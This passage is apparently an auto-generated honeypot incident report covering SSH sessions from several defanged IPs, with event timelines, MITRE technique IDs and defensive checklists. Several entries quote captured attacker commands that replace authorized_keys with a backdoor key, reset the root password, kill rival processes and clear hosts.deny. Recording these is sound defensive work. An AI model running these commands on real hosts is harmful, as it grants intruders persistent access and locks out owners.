- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b30a76df585

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:25 |
| **Last Seen** | 2026-06-23 11:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:25:44` | `cowrie.session.connect` |
| `2026-06-23 11:25:44` | `cowrie.client.version` |
| `2026-06-23 11:25:45` | `cowrie.client.kex` |
| `2026-06-23 11:25:45` | `cowrie.login.success` |
| `2026-06-23 11:25:46` | `cowrie.session.params` |
| `2026-06-23 11:25:46` | `cowrie.command.input` |
| `2026-06-23 11:25:46` | `cowrie.command.failed` |
| `2026-06-23 11:25:46` | `cowrie.log.closed` |
| `2026-06-23 11:25:46` | `cowrie.session.params` |
| `2026-06-23 11:25:46` | `cowrie.command.input` |
| `2026-06-23 11:25:47` | `cowrie.session.file_download` |
| `2026-06-23 11:25:47` | `cowrie.log.closed` |
| `2026-06-23 11:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932768916aae

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:25 |
| **Last Seen** | 2026-06-23 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:25:49` | `cowrie.session.connect` |
| `2026-06-23 11:25:49` | `cowrie.client.version` |
| `2026-06-23 11:25:49` | `cowrie.client.kex` |
| `2026-06-23 11:25:50` | `cowrie.login.success` |
| `2026-06-23 11:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6845f9b1e5bc

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:28 |
| **Last Seen** | 2026-06-23 11:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:28:44` | `cowrie.session.connect` |
| `2026-06-23 11:28:44` | `cowrie.client.version` |
| `2026-06-23 11:28:44` | `cowrie.client.kex` |
| `2026-06-23 11:28:44` | `cowrie.login.success` |
| `2026-06-23 11:28:45` | `cowrie.session.params` |
| `2026-06-23 11:28:45` | `cowrie.command.input` |
| `2026-06-23 11:28:45` | `cowrie.command.failed` |
| `2026-06-23 11:28:45` | `cowrie.log.closed` |
| `2026-06-23 11:28:46` | `cowrie.session.params` |
| `2026-06-23 11:28:46` | `cowrie.command.input` |
| `2026-06-23 11:28:46` | `cowrie.session.file_download` |
| `2026-06-23 11:28:46` | `cowrie.log.closed` |
| `2026-06-23 11:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b542f99eea

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:28 |
| **Last Seen** | 2026-06-23 11:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:28:48` | `cowrie.session.connect` |
| `2026-06-23 11:28:48` | `cowrie.client.version` |
| `2026-06-23 11:28:48` | `cowrie.client.kex` |
| `2026-06-23 11:28:49` | `cowrie.login.success` |
| `2026-06-23 11:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e242d1c1bf

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:29 |
| **Last Seen** | 2026-06-23 11:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:29:59` | `cowrie.session.connect` |
| `2026-06-23 11:29:59` | `cowrie.client.version` |
| `2026-06-23 11:29:59` | `cowrie.client.kex` |
| `2026-06-23 11:30:00` | `cowrie.login.success` |
| `2026-06-23 11:30:00` | `cowrie.session.params` |
| `2026-06-23 11:30:00` | `cowrie.command.input` |
| `2026-06-23 11:30:00` | `cowrie.command.failed` |
| `2026-06-23 11:30:00` | `cowrie.log.closed` |
| `2026-06-23 11:30:01` | `cowrie.session.params` |
| `2026-06-23 11:30:01` | `cowrie.command.input` |
| `2026-06-23 11:30:01` | `cowrie.session.file_download` |
| `2026-06-23 11:30:01` | `cowrie.log.closed` |
| `2026-06-23 11:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a42d846abd

| Field | Detail |
|---|---|
| **Source IP** | `103.181.142[.]22` |
| **First Seen** | 2026-06-23 11:30 |
| **Last Seen** | 2026-06-23 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:30:03` | `cowrie.session.connect` |
| `2026-06-23 11:30:03` | `cowrie.client.version` |
| `2026-06-23 11:30:04` | `cowrie.client.kex` |
| `2026-06-23 11:30:04` | `cowrie.login.success` |
| `2026-06-23 11:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.142[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.181.142[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91630fab1f9

| Field | Detail |
|---|---|
| **Source IP** | `154.116.254[.]157` |
| **First Seen** | 2026-06-23 11:50 |
| **Last Seen** | 2026-06-23 11:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:50:48` | `cowrie.session.connect` |
| `2026-06-23 11:50:48` | `cowrie.client.version` |
| `2026-06-23 11:50:48` | `cowrie.client.kex` |
| `2026-06-23 11:50:50` | `cowrie.login.success` |
| `2026-06-23 11:50:50` | `cowrie.session.params` |
| `2026-06-23 11:50:50` | `cowrie.command.input` |
| `2026-06-23 11:50:50` | `cowrie.command.failed` |
| `2026-06-23 11:50:51` | `cowrie.log.closed` |
| `2026-06-23 11:50:51` | `cowrie.session.params` |
| `2026-06-23 11:50:51` | `cowrie.command.input` |
| `2026-06-23 11:50:51` | `cowrie.session.file_download` |
| `2026-06-23 11:50:51` | `cowrie.log.closed` |
| `2026-06-23 11:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.116.254[.]157` to AbuseIPDB if not already reported
- [ ] Block `154.116.254[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac51c4ab029

| Field | Detail |
|---|---|
| **Source IP** | `154.116.254[.]157` |
| **First Seen** | 2026-06-23 11:50 |
| **Last Seen** | 2026-06-23 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 11:50:55` | `cowrie.session.connect` |
| `2026-06-23 11:50:55` | `cowrie.client.version` |
| `2026-06-23 11:50:55` | `cowrie.client.kex` |
| `2026-06-23 11:50:56` | `cowrie.login.success` |
| `2026-06-23 11:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.116.254[.]157` to AbuseIPDB if not already reported
- [ ] Block `154.116.254[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e82a9396dd89

| Field | Detail |
|---|---|
| **Source IP** | `39.97.255[.]191` |
| **First Seen** | 2026-06-23 12:13 |
| **Last Seen** | 2026-06-23 12:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 12:13:49` | `cowrie.session.connect` |
| `2026-06-23 12:13:49` | `cowrie.client.version` |
| `2026-06-23 12:13:49` | `cowrie.client.kex` |
| `2026-06-23 12:13:50` | `cowrie.login.success` |
| `2026-06-23 12:13:50` | `cowrie.session.params` |
| `2026-06-23 12:13:50` | `cowrie.command.input` |
| `2026-06-23 12:13:54` | `cowrie.log.closed` |
| `2026-06-23 12:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.97.255[.]191` to AbuseIPDB if not already reported
- [ ] Block `39.97.255[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ce28786ef7

| Field | Detail |
|---|---|
| **Source IP** | `82.201.143[.]184` |
| **First Seen** | 2026-06-23 13:07 |
| **Last Seen** | 2026-06-23 13:08 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:A8W57IRdJ83r"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:07:27` | `cowrie.session.connect` |
| `2026-06-23 13:07:27` | `cowrie.client.version` |
| `2026-06-23 13:07:28` | `cowrie.client.kex` |
| `2026-06-23 13:07:29` | `cowrie.login.success` |
| `2026-06-23 13:07:30` | `cowrie.session.params` |
| `2026-06-23 13:07:30` | `cowrie.command.input` |
| `2026-06-23 13:07:30` | `cowrie.command.failed` |
| `2026-06-23 13:07:31` | `cowrie.log.closed` |
| `2026-06-23 13:07:31` | `cowrie.session.params` |
| `2026-06-23 13:07:31` | `cowrie.command.input` |
| `2026-06-23 13:07:31` | `cowrie.session.file_download` |
| `2026-06-23 13:07:31` | `cowrie.log.closed` |
| `2026-06-23 13:08:00` | `cowrie.session.params` |
| `2026-06-23 13:08:00` | `cowrie.command.input` |
| `2026-06-23 13:08:00` | `cowrie.log.closed` |
| `2026-06-23 13:08:01` | `cowrie.session.params` |
| `2026-06-23 13:08:01` | `cowrie.command.input` |
| `2026-06-23 13:08:01` | `cowrie.log.closed` |
| `2026-06-23 13:08:02` | `cowrie.session.params` |
| `2026-06-23 13:08:02` | `cowrie.command.input` |
| `2026-06-23 13:08:03` | `cowrie.session.file_download` |
| `2026-06-23 13:08:03` | `cowrie.log.closed` |
| `2026-06-23 13:08:04` | `cowrie.session.params` |
| `2026-06-23 13:08:04` | `cowrie.command.input` |
| `2026-06-23 13:08:04` | `cowrie.log.closed` |
| `2026-06-23 13:08:05` | `cowrie.session.params` |
| `2026-06-23 13:08:05` | `cowrie.command.input` |
| `2026-06-23 13:08:05` | `cowrie.log.closed` |
| `2026-06-23 13:08:05` | `cowrie.session.params` |
| `2026-06-23 13:08:05` | `cowrie.command.input` |
| `2026-06-23 13:08:05` | `cowrie.command.input` |
| `2026-06-23 13:08:06` | `cowrie.log.closed` |
| `2026-06-23 13:08:06` | `cowrie.session.params` |
| `2026-06-23 13:08:06` | `cowrie.command.input` |
| `2026-06-23 13:08:06` | `cowrie.log.closed` |
| `2026-06-23 13:08:07` | `cowrie.session.params` |
| `2026-06-23 13:08:07` | `cowrie.command.input` |
| `2026-06-23 13:08:07` | `cowrie.log.closed` |
| `2026-06-23 13:08:07` | `cowrie.session.params` |
| `2026-06-23 13:08:07` | `cowrie.command.input` |
| `2026-06-23 13:08:08` | `cowrie.log.closed` |
| `2026-06-23 13:08:08` | `cowrie.session.params` |
| `2026-06-23 13:08:08` | `cowrie.command.input` |
| `2026-06-23 13:08:08` | `cowrie.log.closed` |
| `2026-06-23 13:08:08` | `cowrie.session.params` |
| `2026-06-23 13:08:08` | `cowrie.command.input` |
| `2026-06-23 13:08:09` | `cowrie.log.closed` |
| `2026-06-23 13:08:09` | `cowrie.session.params` |
| `2026-06-23 13:08:09` | `cowrie.command.input` |
| `2026-06-23 13:08:09` | `cowrie.log.closed` |
| `2026-06-23 13:08:10` | `cowrie.session.params` |
| `2026-06-23 13:08:10` | `cowrie.command.input` |
| `2026-06-23 13:08:10` | `cowrie.log.closed` |
| `2026-06-23 13:08:10` | `cowrie.session.params` |
| `2026-06-23 13:08:10` | `cowrie.command.input` |
| `2026-06-23 13:08:11` | `cowrie.log.closed` |
| `2026-06-23 13:08:11` | `cowrie.session.params` |
| `2026-06-23 13:08:11` | `cowrie.command.input` |
| `2026-06-23 13:08:11` | `cowrie.log.closed` |
| `2026-06-23 13:08:12` | `cowrie.session.params` |
| `2026-06-23 13:08:12` | `cowrie.command.input` |
| `2026-06-23 13:08:12` | `cowrie.log.closed` |
| `2026-06-23 13:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.201.143[.]184` to AbuseIPDB if not already reported
- [ ] Block `82.201.143[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3050a7e3fb50

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-23 13:13 |
| **Last Seen** | 2026-06-23 13:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:13:10` | `cowrie.session.connect` |
| `2026-06-23 13:13:10` | `cowrie.client.version` |
| `2026-06-23 13:13:10` | `cowrie.client.kex` |
| `2026-06-23 13:13:11` | `cowrie.login.success` |
| `2026-06-23 13:13:11` | `cowrie.session.params` |
| `2026-06-23 13:13:11` | `cowrie.command.input` |
| `2026-06-23 13:13:11` | `cowrie.command.failed` |
| `2026-06-23 13:13:11` | `cowrie.log.closed` |
| `2026-06-23 13:13:11` | `cowrie.session.params` |
| `2026-06-23 13:13:11` | `cowrie.command.input` |
| `2026-06-23 13:13:11` | `cowrie.session.file_download` |
| `2026-06-23 13:13:11` | `cowrie.log.closed` |
| `2026-06-23 13:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9be3dae0f35

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-23 13:13 |
| **Last Seen** | 2026-06-23 13:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:13:12` | `cowrie.session.connect` |
| `2026-06-23 13:13:12` | `cowrie.client.version` |
| `2026-06-23 13:13:12` | `cowrie.client.kex` |
| `2026-06-23 13:13:13` | `cowrie.login.success` |
| `2026-06-23 13:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09200b246e8

| Field | Detail |
|---|---|
| **Source IP** | `211.46.188[.]16` |
| **First Seen** | 2026-06-23 13:15 |
| **Last Seen** | 2026-06-23 13:15 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WnyY7we63PJI"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:15:19` | `cowrie.session.connect` |
| `2026-06-23 13:15:19` | `cowrie.client.version` |
| `2026-06-23 13:15:19` | `cowrie.client.kex` |
| `2026-06-23 13:15:20` | `cowrie.login.success` |
| `2026-06-23 13:15:20` | `cowrie.session.params` |
| `2026-06-23 13:15:20` | `cowrie.command.input` |
| `2026-06-23 13:15:20` | `cowrie.command.failed` |
| `2026-06-23 13:15:20` | `cowrie.log.closed` |
| `2026-06-23 13:15:21` | `cowrie.session.params` |
| `2026-06-23 13:15:21` | `cowrie.command.input` |
| `2026-06-23 13:15:21` | `cowrie.session.file_download` |
| `2026-06-23 13:15:21` | `cowrie.log.closed` |
| `2026-06-23 13:15:31` | `cowrie.session.params` |
| `2026-06-23 13:15:31` | `cowrie.command.input` |
| `2026-06-23 13:15:31` | `cowrie.log.closed` |
| `2026-06-23 13:15:31` | `cowrie.session.params` |
| `2026-06-23 13:15:31` | `cowrie.command.input` |
| `2026-06-23 13:15:32` | `cowrie.log.closed` |
| `2026-06-23 13:15:32` | `cowrie.session.params` |
| `2026-06-23 13:15:32` | `cowrie.command.input` |
| `2026-06-23 13:15:32` | `cowrie.session.file_download` |
| `2026-06-23 13:15:32` | `cowrie.log.closed` |
| `2026-06-23 13:15:32` | `cowrie.session.params` |
| `2026-06-23 13:15:32` | `cowrie.command.input` |
| `2026-06-23 13:15:33` | `cowrie.log.closed` |
| `2026-06-23 13:15:33` | `cowrie.session.params` |
| `2026-06-23 13:15:33` | `cowrie.command.input` |
| `2026-06-23 13:15:33` | `cowrie.log.closed` |
| `2026-06-23 13:15:33` | `cowrie.session.params` |
| `2026-06-23 13:15:33` | `cowrie.command.input` |
| `2026-06-23 13:15:33` | `cowrie.command.input` |
| `2026-06-23 13:15:34` | `cowrie.log.closed` |
| `2026-06-23 13:15:34` | `cowrie.session.params` |
| `2026-06-23 13:15:34` | `cowrie.command.input` |
| `2026-06-23 13:15:34` | `cowrie.log.closed` |
| `2026-06-23 13:15:34` | `cowrie.session.params` |
| `2026-06-23 13:15:34` | `cowrie.command.input` |
| `2026-06-23 13:15:34` | `cowrie.log.closed` |
| `2026-06-23 13:15:35` | `cowrie.session.params` |
| `2026-06-23 13:15:35` | `cowrie.command.input` |
| `2026-06-23 13:15:35` | `cowrie.log.closed` |
| `2026-06-23 13:15:35` | `cowrie.session.params` |
| `2026-06-23 13:15:35` | `cowrie.command.input` |
| `2026-06-23 13:15:35` | `cowrie.log.closed` |
| `2026-06-23 13:15:36` | `cowrie.session.params` |
| `2026-06-23 13:15:36` | `cowrie.command.input` |
| `2026-06-23 13:15:36` | `cowrie.log.closed` |
| `2026-06-23 13:15:36` | `cowrie.session.params` |
| `2026-06-23 13:15:36` | `cowrie.command.input` |
| `2026-06-23 13:15:36` | `cowrie.log.closed` |
| `2026-06-23 13:15:37` | `cowrie.session.params` |
